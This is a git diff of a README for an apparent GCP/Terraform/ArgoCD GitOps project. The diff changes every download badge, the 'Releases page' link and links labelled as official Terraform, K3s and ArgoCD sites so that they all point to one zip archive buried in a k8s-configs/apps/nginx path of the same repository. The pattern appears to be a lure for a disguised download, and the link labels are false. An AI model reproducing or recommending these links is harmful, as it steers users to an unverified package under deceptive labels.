@@ -1,6 +1,6 @@
 # 🚀 gcp-gitops-lighthouse-config - Simplify Your Cloud Setup
 
-[![Download](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip%https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)
+[![Download](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip%https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)
 
 ## 📦 Overview
 
@@ -26,7 +26,7 @@ To use this application, ensure your system meets the following requirements:
 This section will guide you on how to download and set up the software.
 
 1. **Visit the Releases Page:**
-   Head to the [Releases page](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip) to find the latest version of the application.
+   Head to the [Releases page](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip) to find the latest version of the application.
 
 2. **Download the Latest Version:**
    Look for the version labeled "Latest Release". Click on the download link to get the installation package.
@@ -43,7 +43,7 @@ This section will guide you on how to download and set up the software.
 
 Click below to visit the downloads page and get started:
 
-[![Download](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip%https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)
+[![Download](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip%https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)
 
 Follow the steps above for a smooth installation process.
 
@@ -82,8 +82,8 @@ This project benefits from contributions by a community of developers and users.
 
 ## 🔗 Related Topics
 
-- [Terraform Documentation](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)
-- [K3s Official Site](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)
-- [ArgoCD Homepage](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/terraform/scripts/gcp_config_gitops_lighthouse_3.5.zip)
+- [Terraform Documentation](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)
+- [K3s Official Site](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)
+- [ArgoCD Homepage](https://github.com/ganesh2008born/gcp-gitops-lighthouse-config/raw/refs/heads/main/k8s-configs/apps/nginx/gcp-config-lighthouse-gitops-3.9-alpha.3.zip)
 
 By following these steps, you can effectively set up and use **gcp-gitops-lighthouse-config** to manage your cloud infrastructure with ease. Happy cloud computing!
